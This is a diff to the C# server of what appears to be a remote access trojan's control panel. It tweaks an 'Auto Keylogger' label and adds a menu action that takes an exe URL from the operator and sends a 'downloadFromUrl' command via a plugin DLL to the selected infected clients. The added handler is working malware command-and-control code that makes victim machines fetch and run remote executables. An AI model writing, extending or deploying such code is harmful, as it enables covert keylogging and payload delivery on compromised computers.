@@ -1807,7 +1807,7 @@ namespace Server
                 packet.ForcePathObject("Inject").AsString = "";
 
                 ListViewItem lv = new ListViewItem();
-                lv.Text = "Auto Keylogger.";
+                lv.Text = "Auto Keylogger:";
                 lv.SubItems.Add("0");
                 lv.ToolTipText = Guid.NewGuid().ToString();
 
@@ -1942,6 +1942,41 @@ namespace Server
                 MessageBox.Show(ex.Message);
                 return;
             }
+        }
+
+        private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string Msgbox = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "");
+            if (string.IsNullOrEmpty(Msgbox))
+                return;
+            else
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    try
+                    {
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
+                        packet.ForcePathObject("url").AsString = Msgbox;
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        foreach (Clients client in GetSelectedClients())
+                        {
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                        return;
+                    }
+                }
+            }
+            
         }
     }
 }
